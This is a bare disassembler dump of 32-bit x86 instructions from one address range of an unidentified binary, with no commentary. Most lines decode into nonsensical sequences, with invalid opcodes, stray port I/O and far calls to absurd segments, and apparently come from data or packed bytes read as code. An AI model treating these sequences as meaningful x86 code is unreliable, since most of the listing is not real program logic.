  40f177:	cmp    dh,BYTE PTR [ebx]
  40f179:	adc    eax,0xc0c67c43
  40f17e:	dec    edi
  40f17f:	(bad)  
  40f180:	test   DWORD PTR [ebp+0x204fe1d3],0xdefcda72
  40f18a:	leave  
  40f18b:	jb     0x40f1e1
  40f18d:	lds    edi,FWORD PTR [edx-0x7b]
  40f190:	mov    edx,0xd8b3e666
  40f195:	add    al,0x2c
  40f197:	cld    
  40f198:	bound  edx,QWORD PTR [edi-0x65]
  40f19b:	repz inc ecx
  40f19d:	dec    eax
  40f19e:	push   ss
  40f19f:	cmp    BYTE PTR [edx],dh
  40f1a1:	lock ficomp WORD PTR [ebx]
  40f1a4:	and    eax,0x8c7b7380
  40f1a9:	(bad)  
  40f1ab:	xchg   ecx,eax
  40f1ac:	in     eax,0x28
  40f1ae:	sahf   
  40f1af:	xchg   BYTE PTR [esi-0x67],dh
  40f1b2:	sub    eax,0x28b4acab
  40f1b7:	enter  0x92ab,0xbf
  40f1bb:	(bad)  
  40f1bc:	aaa    
  40f1bd:	cs jns 0x40f1f0
  40f1c0:	adc    al,BYTE PTR ds:0x1565e5fc
  40f1c6:	sub    BYTE PTR [ecx],dl
  40f1c8:	rcr    DWORD PTR [ecx],1
  40f1ca:	bound  eax,QWORD PTR [edi-0x65]
  40f1cd:	int    0x63
  40f1cf:	cmp    bl,cl
  40f1d1:	(bad)  
  40f1d2:	jmp    0xb2d7ff06
  40f1d7:	test   eax,0xf1d4c91
  40f1dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f1dd:	cmp    al,0x2d
  40f1df:	bound  ebp,QWORD PTR [eax+0x43]
  40f1e2:	sub    DWORD PTR [eax-0x61],0xa8b1d369
  40f1e9:	outs   dx,DWORD PTR ds:[esi]
  40f1ea:	xchg   BYTE PTR ds:0x36433e0b,cl
  40f1f0:	jo     0x40f22a
  40f1f2:	sbb    ah,bh
  40f1f4:	pop    esp
  40f1f5:	xchg   ebp,eax
  40f1f6:	cmp    edi,ecx
  40f1f8:	ss add dh,ah
  40f1fb:	sbb    bl,BYTE PTR [edi+edx*4-0x174948d7]
  40f202:	add    eax,0x197bee4e
  40f207:	(bad)  [esi]
  40f209:	dec    eax
  40f20a:	aad    0x13
  40f20c:	stc    
  40f20d:	mov    esp,0x5d2696d7
  40f212:	jae    0x40f1fa
  40f214:	jmp    0x53a5:0xfa86bce6
  40f21b:	(bad)  
  40f21c:	cmp    ch,ch
  40f21e:	fiadd  WORD PTR [esi+ebx*8]
  40f221:	in     eax,0xee
  40f223:	loopne 0x40f1e8
  40f225:	jge    0x40f1b9
  40f227:	mov    al,0x29
  40f229:	je     0x40f277
  40f22b:	out    dx,eax
  40f22c:	adc    al,0x11
  40f22f:	shr    eax,1
  40f231:	in     eax,dx
  40f232:	xor    DWORD PTR [ecx-0x26e35926],0xffffff97
  40f239:	(bad)  
  40f23a:	dec    BYTE PTR [ecx-0x7183f0bd]
  40f240:	or     DWORD PTR [ebx],0xfc79e32a
  40f246:	sub    cl,BYTE PTR [esi+eiz*8]
  40f249:	xor    BYTE PTR [esi+0x6c],0x17
  40f24d:	xor    DWORD PTR [esi],0x3094174a
  40f253:	mov    cl,0x77
  40f255:	mov    edi,0x38614678
  40f25a:	add    edi,edi
  40f25c:	jne    0x40f256
  40f25e:	push   DWORD PTR [ebp-0x4]
  40f261:	call   0x40937f
  40f266:	mov    eax,DWORD PTR [ebp-0x4]
  40f269:	xor    eax,edi
  40f26b:	pop    edi
  40f26c:	add    eax,esi
  40f26e:	jmp    0x40f634
  40f273:	xchg   ecx,eax
  40f274:	pushf  
  40f275:	out    0xec,al
  40f277:	icebp  
  40f278:	jbe    0x40f20b
  40f27a:	popa   
  40f27b:	out    dx,eax
  40f27c:	bound  ecx,QWORD PTR [edx+0x52a873d9]
  40f282:	push   ebx
  40f283:	popa   
  40f284:	stos   BYTE PTR es:[edi],al
  40f285:	jl     0x40f303
  40f287:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f288:	jns    0x40f306
  40f28a:	jl     0x40f235
  40f28c:	icebp  
  40f28d:	je     0x40f224
  40f28f:	xor    al,0xb1
  40f291:	xchg   DWORD PTR [esi],esp
  40f293:	dec    esi
  40f294:	xor    al,0x1b
  40f296:	popf   
  40f297:	push   esp
  40f298:	leave  
  40f299:	jg     0x40f2e3
  40f29b:	add    eax,0x35aad276
  40f2a0:	gs jns 0x40f322
  40f2a3:	cmc    
  40f2a4:	mov    BYTE PTR [ecx+0x55],dl
  40f2a7:	mov    WORD PTR [edx+ecx*2-0x564532db],fs
  40f2ae:	inc    esp
  40f2af:	jmp    0x40f2f1
  40f2b1:	mov    BYTE PTR [edx-0x31],al
  40f2b4:	inc    eax
  40f2b5:	fld    QWORD PTR [bx+di+0x64a9]
  40f2ba:	sbb    DWORD PTR ds:0x8db38be3,eax
  40f2c0:	or     bl,dh
  40f2c2:	xchg   esi,eax
  40f2c3:	pop    ebp
  40f2c4:	mov    es,WORD PTR [esi]
  40f2c6:	psubusw mm2,QWORD PTR [edx+0x43]
  40f2ca:	scas   eax,DWORD PTR es:[edi]
  40f2cb:	(bad)  
  40f2cc:	or     al,0xf0
  40f2ce:	dec    ecx
  40f2cf:	jo     0x40f335
  40f2d1:	pop    ecx
  40f2d2:	xor    eax,0x5b18b6ef
  40f2d7:	cmp    bh,bh
  40f2d9:	cmc    
  40f2da:	pusha  
  40f2db:	xor    BYTE PTR [eax],bh
  40f2dd:	popa   
  40f2de:	div    DWORD PTR ds:0x934c8e75
  40f2e4:	daa    
  40f2e5:	dec    esp
  40f2e6:	sub    esp,DWORD PTR [edx+0x346a5e46]
  40f2ec:	push   es
  40f2ed:	mov    dl,0x46
  40f2ef:	cli    
  40f2f0:	cmp    BYTE PTR [esi],bh
  40f2f2:	ja     0x40f2df
  40f2f4:	or     al,BYTE PTR [ebx]
  40f2f6:	les    ebp,FWORD PTR [ecx+0x66abd5d5]
  40f2fc:	or     esi,DWORD PTR cs:[ebx+ebx*2-0x56330e2]
  40f304:	jne    0x40f31c
  40f306:	xchg   ebx,eax
  40f307:	jmp    0x2cd023d3
  40f30c:	jmp    0x40f325
  40f30e:	mul    BYTE PTR [edi+edx*2-0x76507826]
  40f315:	arpl   WORD PTR [ecx],di
  40f317:	addr16 xchg ebx,eax
  40f319:	pop    esi
  40f31a:	mov    DWORD PTR [esp+esi*8],edi
  40f31d:	push   eax
  40f31e:	lods   eax,DWORD PTR ds:[esi]
  40f31f:	inc    eax
  40f320:	and    cl,cl
  40f322:	shr    dh,0xae
  40f325:	stos   BYTE PTR es:[edi],al
  40f326:	jnp    0x40f2c9
  40f328:	sub    bl,BYTE PTR [esi+ecx*8-0x39]
  40f32c:	mov    BYTE PTR [esi+0x50b76165],ch
  40f332:	cmp    DWORD PTR [edx-0x1f],edi
  40f335:	fcmovne st,st(6)
  40f337:	les    ebp,FWORD PTR ds:0x776b4e19
  40f33d:	xor    al,0x41
  40f33f:	sub    al,0xf6
  40f341:	sub    cl,bl
  40f343:	inc    edi
  40f344:	dec    esp
  40f345:	retf   0xb262
  40f348:	fidiv  DWORD PTR [ebx-0x6df4cfc]
  40f34e:	add    BYTE PTR [ecx+0x18],ch
  40f351:	cmp    al,0x4c
  40f353:	dec    ebx
  40f354:	test   DWORD PTR [eax+eiz*2],0xecb5b09d
  40f35b:	xchg   edi,eax
  40f35c:	aas    
  40f35d:	mov    eax,0x579fa7ca
  40f362:	aaa    
  40f363:	push   cs
  40f364:	sbb    bh,BYTE PTR [ebp-0x43]
  40f367:	xchg   BYTE PTR [ebx+0x24ccc029],bh
  40f36d:	pop    edx
  40f36e:	xchg   DWORD PTR [esi],ebp
  40f370:	add    al,0x7f
  40f372:	and    ebx,DWORD PTR [esi-0x197570c]
  40f378:	scas   eax,DWORD PTR es:[edi]
  40f379:	push   eax
  40f37a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f37b:	sub    BYTE PTR [eax],ch
  40f37d:	popa   
  40f37e:	test   al,0x92
  40f380:	mov    ebp,0x1a7586a3
  40f385:	adc    al,0xca
  40f387:	cdq    
  40f388:	and    al,0xa8
  40f38a:	add    BYTE PTR [eax+0xb],0x54
  40f38e:	ss mov dl,0x76
  40f391:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f392:	retf   0x56d5
  40f395:	cmp    ch,BYTE PTR [eax-0x466972af]
  40f39b:	sbb    eax,0x5ee9e343
  40f3a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f3a1:	idiv   BYTE PTR ds:0x3a3c60bd
  40f3a7:	mov    BYTE PTR [esi-0x18effe70],ch
  40f3ad:	imul   edx,DWORD PTR [ebp+0x1c],0xffffff9f
  40f3b1:	cmp    cl,BYTE PTR [edx+0x141d2e81]
  40f3b7:	psubusw mm5,QWORD PTR [edi*4-0x2718d6a]
  40f3bf:	cmp    BYTE PTR [edx],dh
  40f3c1:	xchg   edx,eax
  40f3c2:	xchg   ebx,eax
  40f3c3:	push   ss
  40f3c4:	mov    esi,0xee0b8783
  40f3c9:	sbb    al,0x5a
  40f3cb:	cmp    edx,DWORD PTR [ebp+0x6e5f55cd]
  40f3d1:	mov    ebx,?
  40f3d3:	lds    ecx,FWORD PTR [eax+0x5f093479]
  40f3d9:	adc    ebx,esp
  40f3db:	pushf  
  40f3dc:	aaa    
  40f3dd:	or     eax,DWORD PTR [edi]
  40f3df:	push   es
  40f3e0:	sbb    esi,DWORD PTR [ecx+edx*1]
  40f3e3:	retf   0xc550
  40f3e6:	mov    edi,0x81e6902a
  40f3eb:	pop    esp
  40f3ec:	in     al,dx
  40f3ed:	test   al,0x7e
  40f3ef:	fsub   st(7),st
  40f3f1:	cmp    al,BYTE PTR [esi+0x5f]
  40f3f4:	add    eax,0x5f3fc7a4
  40f3f9:	mov    esp,0xa84b05de
  40f3fe:	jl     0x40f3f9
  40f400:	aaa    
  40f401:	into   
  40f402:	jns    0x40f41d
  40f404:	bound  edi,QWORD PTR [ebx]
  40f406:	test   DWORD PTR [esi+0x1078edda],edx
  40f40c:	sbb    bh,BYTE PTR [ebx]
  40f40e:	sbb    eax,0x3879d1b1
  40f413:	pushf  
  40f414:	mov    ds:0xe0c30421,al
  40f419:	xchg   edi,eax
  40f41a:	test   eax,0xccaef4de
  40f41f:	rcl    DWORD PTR [edi],0x38
  40f422:	inc    esi
  40f423:	in     eax,dx
  40f424:	inc    edx
  40f425:	rcr    DWORD PTR [ebp-0x55],1
  40f428:	xor    al,0x2
  40f42a:	sar    BYTE PTR [edx+0x4f],0x52
  40f42e:	lock repz iret 
  40f431:	jecxz  0x40f47b
  40f433:	mov    ah,BYTE PTR [ecx-0x56a3b42b]
  40f439:	outs   dx,BYTE PTR ds:[esi]
  40f43a:	in     al,dx
  40f43b:	es retf 0x8a6f
  40f43f:	sbb    BYTE PTR [ecx],0x7f
  40f442:	add    dl,BYTE PTR [eax]
  40f444:	pop    ebx
  40f445:	addr16 or eax,0x2f694b3c
  40f44b:	push   esi
  40f44c:	retf   
  40f44d:	and    ah,bl
  40f44f:	adc    eax,0x1832ab5
  40f454:	dec    esi
  40f455:	test   dh,bl
  40f457:	jp     0x40f4c3
  40f459:	repnz or BYTE PTR [edi+0x7037b652],ch
  40f460:	rol    DWORD PTR [edi+ebx*8],1
  40f463:	push   esp
  40f464:	pop    edx
  40f465:	call   0xc504cf49
  40f46a:	or     DWORD PTR [ebx-0x4f],ebp
  40f46d:	add    BYTE PTR [eax-0x97e6a14],ch
  40f473:	addr16 add eax,0x72d5e663
  40f479:	test   al,0xcd
  40f47b:	sub    ecx,ecx
  40f47d:	clc    
  40f47e:	push   eax
  40f47f:	cmp    al,0xcd
  40f481:	push   0x6e
  40f483:	sbb    DWORD PTR ds:0x29e5d34c,esi
  40f489:	fisttp DWORD PTR [edx]
  40f48b:	jno    0x40f469
  40f48d:	inc    edx
  40f48e:	adc    ecx,esp
  40f490:	ret    
  40f491:	bound  eax,QWORD PTR [esi+ebp*4+0x362e68c6]
  40f498:	lods   eax,DWORD PTR ds:[esi]
  40f499:	sbb    ch,ch
  40f49b:	xchg   ebp,eax
  40f49c:	mov    ds:0xbe218939,al
  40f4a1:	inc    edx
  40f4a2:	xor    esi,DWORD PTR [edi+0x1d42fedd]
  40f4a8:	xchg   ebp,eax
  40f4a9:	scas   eax,DWORD PTR es:[edi]
  40f4aa:	scas   al,BYTE PTR es:[edi]
  40f4ab:	iret   
  40f4ac:	or     esp,DWORD PTR [eax+0x4fc5b1d6]
  40f4b2:	sub    al,BYTE PTR [ebx+0x6daf5c4a]
  40f4b8:	jg     0x40f4ca
  40f4ba:	mov    bl,0x11
  40f4bc:	xchg   ebx,eax
  40f4bd:	mov    dh,0xa8
  40f4bf:	outs   dx,DWORD PTR ds:[esi]
  40f4c0:	iret   
  40f4c1:	pop    esp
  40f4c2:	xor    ch,ch
  40f4c4:	sbb    eax,0xad9b3c90
  40f4c9:	inc    esi
  40f4ca:	dec    esi
  40f4cb:	fwait
  40f4cc:	(bad)  
  40f4cd:	mov    edx,0xb5908ee3
  40f4d2:	bound  eax,QWORD PTR [eax+0x6e]
  40f4d5:	outs   dx,BYTE PTR ds:[esi]
  40f4d6:	push   ebp
  40f4d7:	int    0x42
  40f4d9:	cmp    eax,0xb6825772
  40f4de:	into   
  40f4df:	mov    ds:0xc7980026,al
  40f4e4:	push   esi
  40f4e5:	sahf   
  40f4e6:	jmp    0xb7926323
  40f4eb:	add    eax,0x45610db0
  40f4f0:	cs pop eax
  40f4f2:	mov    eax,0xa5b776b6
  40f4f7:	jbe    0x40f559
  40f4f9:	and    edx,DWORD PTR [edi]
  40f4fb:	mov    ?,WORD PTR [edi-0x65]
  40f4fe:	call   0x2c0e:0x92aead79
  40f505:	sub    ebx,DWORD PTR [ecx]
  40f507:	call   0x127:0x257ed7d5
  40f50e:	shl    dh,1
  40f510:	push   ebx
  40f511:	std    
  40f512:	out    0xf8,al
  40f514:	lods   al,BYTE PTR ds:[esi]
  40f515:	mov    dl,bl
  40f517:	dec    edx
  40f518:	mov    dl,0x82
  40f51a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f51b:	test   eax,0x9bcc635a
  40f520:	sub    bl,BYTE PTR ss:0x4827e29f
  40f527:	iret   
  40f528:	push   0x306d1cf3
  40f52d:	stos   BYTE PTR es:[edi],al
  40f52e:	jl     0x40f4d9
  40f530:	jmp    0x40f4e5
  40f532:	jno    0x40f54d
  40f534:	stos   BYTE PTR es:[edi],al
  40f535:	scas   eax,DWORD PTR es:[edi]
  40f536:	outs   dx,DWORD PTR ds:[esi]
  40f537:	mov    ebx,0x88d77da
  40f53c:	add    BYTE PTR [ebx-0x6f32db3e],bh
  40f542:	dec    esp
  40f543:	loop   0x40f56a
  40f545:	inc    esi
  40f546:	jae    0x40f4d7
  40f548:	xor    DWORD PTR [esi],eax
  40f54a:	shl    eax,0x7c
  40f54d:	add    BYTE PTR [ecx],ah
  40f54f:	dec    ebx
  40f550:	sub    eax,0x11fd854b
  40f555:	dec    edx
  40f556:	test   al,0x43
  40f558:	sbb    al,0x96
  40f55a:	inc    esi
  40f55b:	adc    bh,al
  40f55d:	aas    
  40f55e:	or     DWORD PTR [edi],0x31
  40f561:	cmp    al,0xd3
  40f563:	call   0x3cf2:0x4e32b787
  40f56a:	jl     0x40f5c9
  40f56c:	mov    fs:0xefe1f2d7,eax
  40f572:	or     BYTE PTR [ebp+0x1b],dl
  40f575:	mov    ecx,0x83679054
  40f57a:	aam    0x9a
  40f57c:	fdivr  QWORD PTR ds:0xf92f3669
  40f582:	in     al,0xfb
  40f584:	cdq    
  40f585:	sub    BYTE PTR [ebp+0x7356be14],dl
  40f58b:	and    al,0xf7
  40f58d:	dec    edx
  40f58e:	adc    al,0x69
  40f590:	and    al,0x65
  40f592:	dec    edi
  40f593:	je     0x40f5f6
  40f595:	mov    esi,0xf6f73521
  40f59a:	mov    ch,0xff
  40f59c:	js     0x40f5bb
  40f59e:	mov    bh,0x77
  40f5a0:	xchg   al,dh
  40f5a2:	xor    al,0x67
  40f5a4:	push   0xffffffd3
  40f5a6:	out    dx,eax
  40f5a7:	push   eax
  40f5a8:	push   ecx
  40f5a9:	or     eax,0xa330ce2f
  40f5ae:	outs   dx,BYTE PTR ds:[esi]
  40f5af:	add    bl,BYTE PTR [edx]
  40f5b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f5b2:	enter  0x4df7,0x10
  40f5b6:	or     eax,0xbab3e157
  40f5bb:	push   ss
  40f5bc:	aas    
  40f5bd:	xchg   edi,eax
  40f5be:	fs jae 0x40f625
  40f5c1:	xor    BYTE PTR ds:0x700b54c7,ah
  40f5c7:	test   eax,ebx
  40f5c9:	daa    
  40f5ca:	adc    dh,BYTE PTR [eax]
  40f5cc:	xchg   esi,eax
  40f5cd:	xchg   BYTE PTR [ebx-0x79],bl
  40f5d0:	pop    ebp
  40f5d1:	mov    ah,0xb0
  40f5d3:	mov    bh,0x5e
  40f5d5:	pushf  
  40f5d6:	fld    QWORD PTR ds:0xe0560ad2
  40f5dc:	mov    dh,0xf1
  40f5de:	xchg   ecx,eax
  40f5df:	mov    edx,0xa8b7d465
  40f5e4:	outs   dx,BYTE PTR ds:[esi]
  40f5e5:	scas   al,BYTE PTR es:[edi]
  40f5e6:	add    al,0x2a
  40f5e8:	lahf   
  40f5e9:	(bad)  
  40f5ea:	mov    al,ds:0x3d2d725
  40f5ef:	jns    0x40f590
  40f5f1:	out    dx,eax
  40f5f2:	stos   BYTE PTR es:[edi],al
  40f5f3:	mov    ebx,0x102fb83a
  40f5f8:	cmp    bh,ah
  40f5fa:	push   es
  40f5fb:	int3   
  40f5fc:	mov    esp,0xecada7d6
  40f601:	push   ds
  40f602:	es scas eax,DWORD PTR es:[edi]
  40f604:	inc    ecx
  40f605:	push   ebp
  40f606:	imul   edi,ecx,0xffffffb1
  40f609:	and    al,0x49
  40f60b:	cmp    DWORD PTR [edi],edx
  40f60d:	neg    DWORD PTR [edx]
  40f60f:	dec    esi
  40f610:	retf   0xcf22
  40f613:	imul   edx,eax,0x4
  40f616:	lds    ebp,FWORD PTR [edx+0x4d]
  40f619:	or     dh,BYTE PTR ds:0x626845f7
  40f61f:	mov    bl,0x55
  40f621:	imul   edx,DWORD PTR [ebx+0x2efb90a3],0x1d30a5f3
  40f62b:	lods   al,BYTE PTR ds:[esi]
  40f62c:	jmp    0x40f69a
  40f62e:	sub    al,0xf4
  40f630:	js     0x40f5b9
  40f632:	and    DWORD PTR [esi+ebx*2+0xcc2c9],ecx
  40f639:	push   ebp
  40f63a:	mov    ebp,esp
  40f63c:	push   ecx
  40f63d:	mov    DWORD PTR [ebp-0x4],0xf89c8535
  40f644:	mov    eax,DWORD PTR [ebp+0x8]
  40f647:	sbb    DWORD PTR ds:0x4335ef,0x1bf0
  40f651:	mov    al,BYTE PTR [eax]
  40f653:	and    DWORD PTR ds:0x4335df,0x4335a3
  40f65d:	jmp    0x40f925
  40f662:	pop    es
  40f663:	sbb    DWORD PTR [edx],ebp
  40f665:	pop    ecx
  40f666:	xor    dh,BYTE PTR [ebp+0x53]
  40f669:	popa   
  40f66a:	inc    eax
  40f66b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f66c:	push   esi
  40f66d:	call   0xb688:0x2f4eff63
  40f674:	jl     0x40f6f2
  40f676:	mov    eax,ds:0x397c7c7e
  40f67b:	mov    edi,0x68efbd2c
  40f680:	mov    BYTE PTR [edi+0x42ac3250],cl
  40f686:	jg     0x40f691
  40f688:	cmp    DWORD PTR [eax+0x17],0x3
  40f68c:	mov    dl,0x8f
  40f68e:	gs sahf 
  40f690:	pop    esp
  40f691:	dec    edx
  40f692:	popf   
  40f693:	fs inc ebx
  40f695:	jmp    0x40f635
  40f697:	jns    0x40f6b5
  40f699:	adc    eax,0x6a3c3c28
  40f69e:	jnp    0x40f6a5
  40f6a0:	gs hlt 
  40f6a2:	and    BYTE PTR [ebx-0x473e7799],0x86
  40f6a9:	inc    DWORD PTR [esi+0x4521eaad]
  40f6af:	jl     0x40f6ca
  40f6b1:	xchg   BYTE PTR [eax+0x1c],bl
  40f6b4:	mov    esi,0x5c97fb91
  40f6b9:	repnz in al,dx
  40f6bb:	push   ebx
  40f6bc:	push   ebx
  40f6bd:	dec    esi
  40f6be:	inc    ecx
  40f6bf:	jmp    0x40f652
  40f6c1:	jnp    0x40f708
  40f6c3:	in     eax,0xa2
  40f6c5:	out    0x50,eax
  40f6c7:	sahf   
  40f6c8:	ret    
  40f6c9:	imul   edx,DWORD PTR [esi+ebp*2+0x50d97a0c],0x48
  40f6d1:	mov    esi,0xb61d3858
  40f6d6:	fs jmp 0xbbd2:0x2115e1b4
  40f6de:	add    edx,edi
  40f6e0:	pop    ecx
  40f6e1:	outs   dx,DWORD PTR ds:[esi]
  40f6e2:	and    esi,DWORD PTR [edi+0x481c42e2]
  40f6e8:	or     DWORD PTR [edx],0xffffffd7
  40f6eb:	jnp    0x40f6de
  40f6ed:	xor    al,0x60
  40f6ef:	iret   
  40f6f0:	out    0xe0,eax
  40f6f2:	clc    
  40f6f3:	lods   eax,DWORD PTR ds:[esi]
  40f6f4:	mov    dh,0xbd
  40f6f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f6f7:	adc    BYTE PTR cs:[edi-0x380b95ec],0xca
  40f6ff:	clc    
  40f700:	retf   
  40f701:	mov    BYTE PTR [esi-0x54],bh
  40f704:	lods   al,BYTE PTR ds:[esi]
  40f705:	ins    DWORD PTR es:[edi],dx
  40f706:	js     0x40f740
  40f708:	push   esi
  40f709:	aaa    
  40f70a:	stc    
  40f70b:	imul   ebx,DWORD PTR [eax-0x45],0x7064bbff
  40f712:	sub    al,0x8a
  40f714:	pop    es
  40f715:	mov    al,ds:0x8eb3009e
  40f71a:	dec    edx
  40f71b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f71c:	fcom   QWORD PTR [ecx-0x4c21e6ab]
  40f722:	mov    ebp,0xcdeaab09
  40f727:	mov    ds:0x34b6b327,al
  40f72c:	scas   al,BYTE PTR es:[edi]
  40f72d:	ja     0x40f6eb
  40f72f:	out    dx,eax
  40f730:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f731:	mov    dh,0x8f
  40f733:	call   0xb389ef4e
  40f738:	arpl   dx,bx
  40f73a:	outs   dx,DWORD PTR ds:[esi]
  40f73b:	pushf  
  40f73c:	jp     0x40f6e9
  40f73e:	xor    al,0x17
  40f740:	rsqrtps xmm0,XMMWORD PTR ds:0xab78a8bd
  40f747:	jnp    0x40f7c2
  40f749:	sbb    al,dl
  40f74b:	call   0x4bab:0x624a61eb
  40f752:	inc    esp
  40f753:	imul   eax,DWORD PTR [eax-0xb7931e9],0xb
  40f75a:	push   es
  40f75b:	stos   DWORD PTR es:[edi],eax
  40f75c:	xchg   esp,eax
  40f75d:	push   0x4e
  40f75f:	jecxz  0x40f7d2
  40f761:	inc    ecx
  40f762:	sahf   
  40f763:	rcr    esp,cl
  40f765:	repnz sub eax,0xf5752adb
  40f76b:	push   ds
  40f76c:	loop   0x40f734
  40f76e:	jae    0x40f76a
  40f770:	addr16 ja 0x40f7d3
  40f773:	imul   ebp,ebp,0xffffff9f
  40f776:	imul   esi,DWORD PTR ds:0x68c9,0x74291bc9
  40f77f:	jmp    0xaf25:0x1a0db656
  40f786:	push   ebp
  40f787:	add    ebp,DWORD PTR [ecx]
  40f789:	(bad)  
  40f78a:	sbb    edi,DWORD PTR ds:0x2db7fd1f
  40f790:	popf   
  40f791:	xchg   esp,eax
  40f792:	and    esi,DWORD PTR [bx+di-0x61c4]
  40f797:	push   ebx
  40f798:	in     eax,dx
  40f799:	dec    DWORD PTR [esi-0x7f40e7c4]
  40f79f:	xchg   edx,eax
  40f7a0:	cmp    al,0xf8
  40f7a2:	shl    cl,cl
  40f7a4:	sbb    BYTE PTR [esi-0x1a5cec6a],ah
  40f7aa:	jnp    0x40f72c
  40f7ac:	lds    esi,FWORD PTR [edi+ebx*2+0x60a81db2]
  40f7b3:	sub    ecx,eax
  40f7b5:	jno    0x40f81d
  40f7b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f7b8:	ins    BYTE PTR es:[edi],dx
  40f7b9:	gs xchg ebx,eax
  40f7bb:	mov    esi,0x338566a5
  40f7c0:	or     eax,0xf8e87726
  40f7c5:	shl    cl,0x52
  40f7c8:	jb     0x40f7b8
  40f7ca:	mov    esp,0xf23b03f4
  40f7cf:	outs   dx,BYTE PTR ds:[esi]
  40f7d0:	mov    ah,0x22
  40f7d2:	push   edi
  40f7d3:	pop    ebx
  40f7d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f7d5:	xor    BYTE PTR [edx-0x5899c015],bl
  40f7db:	and    eax,0xa072ba7
  40f7e0:	sub    edi,edx
  40f7e2:	pop    DWORD PTR [edi]
  40f7e4:	add    eax,0xe0bbd3a1
  40f7e9:	sbb    esp,0xffffffcc
  40f7ec:	push   ebp
  40f7ed:	jmp    0x40f7d9
  40f7ef:	sbb    al,BYTE PTR [ebx-0x57]
  40f7f2:	and    DWORD PTR [eax+edx*8],0x348fc53a
  40f7f9:	test   al,0xcd
  40f7fb:	xor    BYTE PTR [eax-0x606ac3b5],dl
  40f801:	sbb    DWORD PTR [ebx],esp
  40f803:	jae    0x40f7a0
  40f805:	aas    
  40f806:	pop    DWORD PTR [eax+0x63]
  40f809:	adc    ebp,DWORD PTR [ecx+0x42a21e62]
  40f80f:	(bad)  
  40f810:	dec    eax
  40f811:	dec    ebp
  40f812:	mov    ecx,0xd9fe260f
  40f817:	jb     0x40f876
  40f819:	jae    0x40f898
  40f81b:	(bad)  
  40f81c:	fwait
  40f81d:	and    dh,BYTE PTR [edx+0x6e41035c]
  40f823:	sub    DWORD PTR es:[edx],ebp
  40f826:	xor    dh,BYTE PTR [ecx+ebp*1]
  40f829:	jb     0x40f864
  40f82b:	fsub   st(2),st
  40f82d:	mov    dl,0xc0
  40f82f:	aad    0xa1
  40f831:	pushf  
  40f832:	stc    
  40f833:	loope  0x40f8a5
  40f835:	cld    
  40f836:	pushf  
  40f837:	xchg   ebp,eax
  40f838:	and    al,BYTE PTR [edi]
  40f83a:	cmp    eax,eax
  40f83c:	mov    BYTE PTR [edi+0x121c4b47],al
  40f842:	cdq    
  40f843:	das    
  40f844:	test   al,0xce
  40f846:	adc    BYTE PTR [eax+0x79],dh
  40f849:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f84a:	out    0xab,eax
  40f84c:	inc    ecx
  40f84d:	rcl    BYTE PTR [esp+edx*8+0xf],cl
  40f851:	nop
  40f852:	push   edi
  40f853:	ins    DWORD PTR es:[edi],dx
  40f854:	xchg   edx,eax
  40f855:	xor    ebp,ebx
  40f857:	mov    ebx,DWORD PTR [edx]
  40f859:	and    eax,0x7ed12256
  40f85e:	gs sti 
  40f860:	inc    edx
  40f861:	mov    bh,0x70
  40f863:	scas   eax,DWORD PTR es:[edi]
  40f864:	icebp  
  40f865:	inc    ebp
  40f866:	std    
  40f867:	aad    0xec
  40f869:	cmc    
  40f86a:	cmp    al,0x12
  40f86c:	out    0xe8,eax
  40f86e:	clc    
  40f86f:	cmc    
  40f870:	out    0x89,al
  40f872:	and    bh,ah
  40f874:	popa   
  40f875:	mov    bl,0xf6
  40f877:	add    dh,ah
  40f879:	mov    cl,0x3d
  40f87b:	jnp    0x40f8b3
  40f87d:	fcomp  QWORD PTR [ebp+0x5c35dcf6]
  40f883:	pop    edx
  40f884:	test   DWORD PTR [ebp+esi*1-0x3aadf0fa],ebx
  40f88b:	rcl    cl,cl
  40f88d:	mov    edi,0xa7f6700d
  40f892:	mov    eax,ds:0xfdd4571
  40f897:	xchg   esi,eax
  40f898:	xchg   esp,eax
  40f899:	push   ebx
  40f89a:	sbb    al,0x8c
  40f89c:	push   0x7cea4c36
  40f8a1:	jno    0x40f85b
  40f8a3:	lea    ebp,[edi-0x51]
  40f8a6:	call   0xbd36:0xfec073fe
  40f8ad:	jl     0x40f8e4
  40f8af:	pop    eax
  40f8b0:	repnz sbb dh,cl
  40f8b3:	(bad)  
  40f8b4:	mov    dh,0x91
  40f8b6:	mov    esi,0xc866f573
  40f8bb:	mov    cl,0x55
  40f8bd:	mov    cl,0xb2
  40f8bf:	inc    ebx
  40f8c0:	lock gs push esi
  40f8c3:	iret   
  40f8c4:	clc    
  40f8c5:	jmp    0xffe4d839
  40f8ca:	adc    DWORD PTR [eax-0x7a],0xfffffff0
  40f8ce:	outs   dx,DWORD PTR ds:[esi]
  40f8cf:	sbb    eax,0xbe9bfa25
  40f8d4:	or     bh,BYTE PTR [edi+0x13]
  40f8d7:	cmp    eax,0xdb57664
  40f8dc:	ds out 0xc2,al
  40f8df:	jge    0x40f8b7
  40f8e1:	and    al,0x30
  40f8e3:	sub    eax,0xdfa0900f
  40f8e8:	sub    ah,BYTE PTR ds:0x3b8c42e8
  40f8ee:	mov    eax,0xd80aca74
  40f8f3:	xchg   al,bl
  40f8f5:	mov    bl,0x61
  40f8f7:	mov    edi,0x4566787a
  40f8fc:	add    esp,DWORD PTR [edx+0x5e]
  40f8ff:	add    al,bh
  40f901:	cwde   
  40f902:	xor    esp,DWORD PTR [ebx]
  40f904:	bound  edi,QWORD PTR ds:0x2bfa0d90
  40f90a:	(bad)  
  40f90b:	mov    eax,0x5c33a1a3
  40f910:	clc    
  40f911:	sub    BYTE PTR [ecx+0x7da54453],dh
  40f917:	pop    ecx
  40f918:	loope  0x40f98b
  40f91a:	sub    al,0xe5
